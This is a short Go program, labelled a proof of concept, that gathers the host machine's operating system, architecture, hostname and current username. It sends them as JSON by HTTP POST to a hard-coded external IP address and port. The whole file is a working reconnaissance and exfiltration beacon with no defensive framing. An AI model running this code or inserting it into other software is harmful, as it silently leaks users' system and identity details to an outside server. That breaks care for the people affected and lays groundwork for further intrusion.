package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"os/user"
)

type SystemInfo struct {
	OS       string `json:"os"`
	Arch     string `json:"architecture"`
	Hostname string `json:"hostname"`
	User     string `json:"user"`
}

func main() {
	// Get system details
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	info := SystemInfo{
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		User:     currentUser.Username,
	}

	// Convert to JSON
	jsonData, err := json.Marshal(info)
	if err != nil {
		fmt.Println("Error encoding JSON:", err)
		return
	}

	// Send data to external server
	url := "http://3.149.230.67:1244"
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Failed to send data:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("\n[+] PoC: System details sent successfully!")
}
